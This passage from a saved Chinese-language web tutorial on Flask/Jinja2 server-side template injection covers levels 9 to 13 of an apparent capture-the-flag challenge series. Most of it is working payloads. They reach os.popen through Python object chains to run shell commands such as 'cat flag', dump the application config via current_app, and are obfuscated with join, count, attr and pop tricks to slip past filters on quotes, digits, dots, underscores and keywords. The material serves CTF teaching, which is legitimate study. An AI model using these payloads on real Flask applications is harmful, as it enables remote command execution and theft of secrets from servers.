<span class="n">使用replace过滤器</span><span class="o">.</span><span class="n">它的作用是替换字符串</span><span class="err">，</span><span class="n">举个例子</span>
<span class="n">如</span><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="s2">"__inia__"</span><span class="o">|</span><span class="n">replace</span><span class="p">(</span><span class="s2">"ia"</span><span class="p">,</span><span class="s2">"it"</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<h3 id="toc_level-9"><a href="https://tttang.com/archive/1698/#toc_level-9">level 9</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/4e82e130-4871-476e-b476-af0069b77850.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/4e82e130-4871-476e-b476-af0069b77850.png"></a><br>
过滤了数字，这个比较简单了就，我们可以利用不涉及数字的，直接就绕过了<br>
这里给出一个payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'__builtins__'</span><span class="p">][</span><span class="s1">'eval'</span><span class="p">](</span><span class="s2">"__import__('os').popen('cat flag').read()"</span><span class="p">)}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/e2be2ab1-c2bf-4f4e-9841-cf239ae857c7.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/e2be2ab1-c2bf-4f4e-9841-cf239ae857c7.png"></a><br>
不过正常的思路的话应该是用join进行拼接后，加上count，从而得到想得到的数字，举个例子</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span> 
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/8a4ae22f-48c7-4826-8193-1a387270227d.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/8a4ae22f-48c7-4826-8193-1a387270227d.png"></a><br>
我们这里利用这个payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p>简单修改一下</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">print</span><span class="p">(()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="n">a</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">%</span><span class="p">}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/89045fc8-4c82-44b6-9f92-72f853cf5711.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/89045fc8-4c82-44b6-9f92-72f853cf5711.png"></a></p>
<h3 id="toc_level-10"><a href="https://tttang.com/archive/1698/#toc_level-10">level 10</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/529ed33d-008e-4962-8cab-ae07f8b49eef.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/529ed33d-008e-4962-8cab-ae07f8b49eef.png"></a><br>
本关的目的是<code>get config</code>，设置了config为空<br>
这里需要扩展一下，存在这样一个变量<code>current_app</code>，它的介绍如下</p>
<blockquote>
<p>应用上下文会在必要时被创建和销毁。它不会在线程间移动，并且也不会在不同的请求之间共享。正因为如此，它是一个存储数据库连接信息或是别的东西的最佳位置</p>
</blockquote>
<p>这里可以尝试用它来进行绕过<br>
构造的payload如下</p>
<div class="highlight"><pre><span></span><code><span class="p">{{</span><span class="n">url_for</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'current_app'</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="p">}}</span>
<span class="p">{{</span><span class="n">get_flashed_messages</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'current_app'</span><span class="p">]</span><span class="o">.</span><span class="n">config</span><span class="p">}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/95d60abd-7dff-49ce-97fe-4bce48fb62d5.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/95d60abd-7dff-49ce-97fe-4bce48fb62d5.png"></a></p>
<h3 id="toc_level-11"><a href="https://tttang.com/archive/1698/#toc_level-11">level 11</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/92e302cb-a002-4a5d-a162-df495c298ac5.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/92e302cb-a002-4a5d-a162-df495c298ac5.png"></a><br>
过滤了单引号、双引号、加号、<code>request</code>，引号和中括号,这里我们使用这个payload</p>
<div class="highlight"><pre><span></span><code><span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">133</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">'popen'</span><span class="p">](</span><span class="s1">'cat flag'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</code></pre></div>

<p>点被过滤，这里用attr来替代，关键词的话我们这里可以用join拼接来进行获取，修改过后的payload如下</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__cla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">ss__</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__bas</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">e__</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__subcla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">sses__</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span>   
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">d</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__ge</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">titem__</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">e</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__in</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">it__</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">f</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">__glo</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">bals__</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">pop</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">en</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">h</span><span class="o">=</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="mi">18</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>  <span class="c1">#构造空格</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">flag</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">cat</span><span class="o">=</span><span class="n">abc</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">h</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">flag</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">re</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">read</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">c</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="mi">133</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">g</span><span class="p">)(</span><span class="n">flag</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">re</span><span class="p">)()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/f9ab3a1f-e4f7-4f24-a41c-674e6cf6236a.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/f9ab3a1f-e4f7-4f24-a41c-674e6cf6236a.png"></a></p>
<h3 id="toc_level-12"><a href="https://tttang.com/archive/1698/#toc_level-12">level 12</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/437eac95-8cb5-4e9f-b35f-7c067f012648.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/437eac95-8cb5-4e9f-b35f-7c067f012648.png"></a><br>
跟上关差不多，多过滤了个数字和下划线，我们用count来获取数字，构造pop来获取下划线即可即可<br>
<a href="./FLask SSTI从零到入门 - 跳跳糖_files/7f3d6938-5e06-4661-9d39-88c656e2ab9b.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/7f3d6938-5e06-4661-9d39-88c656e2ab9b.png"></a></p>
<p>沿用上关payload，简单修改一下</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">po</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">two</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">two</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eighteen</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">hundred</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">class</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">subclasses</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>   
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">d</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">e</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">init</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">f</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">pop</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">en</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">h</span><span class="o">=</span><span class="bp">self</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">eighteen</span><span class="p">)</span><span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">flag</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">cat</span><span class="o">=</span><span class="n">abc</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">h</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">flag</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">re</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">read</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">c</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">hundred</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">g</span><span class="p">)(</span><span class="n">flag</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">re</span><span class="p">)()}}</span>
</code></pre></div>

<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/f1a7b7a4-587b-4428-84db-e072b4f43b83.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/f1a7b7a4-587b-4428-84db-e072b4f43b83.png"></a></p>
<h3 id="toc_level-13"><a href="https://tttang.com/archive/1698/#toc_level-13">level 13</a></h3>
<p><a href="./FLask SSTI从零到入门 - 跳跳糖_files/a33e3b2d-e475-4276-aaaa-565a323cd08a.png" class="image"><img alt="在这里插入图片描述" src="./FLask SSTI从零到入门 - 跳跳糖_files/a33e3b2d-e475-4276-aaaa-565a323cd08a.png"></a><br>
过滤增添了一些关键词，其中<code>self</code>被ban，本来用它设置的空格，但无妨，我们这里可以利用pop构造空格，简单修改一下之前的payload</p>
<div class="highlight"><pre><span></span><code><span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">po</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">po</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">p</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">one</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">two</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">x</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">two</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">eighteen</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">hundred</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">|</span><span class="n">count</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span> <span class="nb">set</span> <span class="n">a</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">cla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">ss</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">b</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>  
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">c</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">subcla</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">sses</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span> <span class="o">%</span><span class="p">}</span>   
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">d</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">getitem</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">e</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">ini</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">t</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">f</span><span class="o">=</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="nb">globals</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">()</span><span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">g</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">pop</span><span class="o">=</span><span class="n">a</span><span class="p">,</span><span class="n">en</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span> <span class="o">%</span><span class="p">}</span> 
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">h</span><span class="o">=</span><span class="p">(()</span><span class="o">|</span><span class="n">select</span><span class="o">|</span><span class="n">string</span><span class="o">|</span><span class="nb">list</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">po</span><span class="p">)(</span><span class="n">one</span><span class="p">)</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">flag</span><span class="o">=</span><span class="p">(</span><span class="nb">dict</span><span class="p">(</span><span class="n">cat</span><span class="o">=</span><span class="n">abc</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">,</span><span class="n">h</span><span class="p">,</span><span class="nb">dict</span><span class="p">(</span><span class="n">flag</span><span class="o">=</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{</span><span class="o">%</span><span class="nb">set</span> <span class="n">re</span><span class="o">=</span><span class="nb">dict</span><span class="p">(</span><span class="n">read</span><span class="o">=</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">join</span><span class="o">%</span><span class="p">}</span>
<span class="p">{{()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">c</span><span class="p">)()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">hundred</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">f</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">d</span><span class="p">)(</span><span class="n">g</span><span class="p">)(</span><span class="n">flag</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="n">re</span><span class="p">)()}}</span>
</code></pre></div>

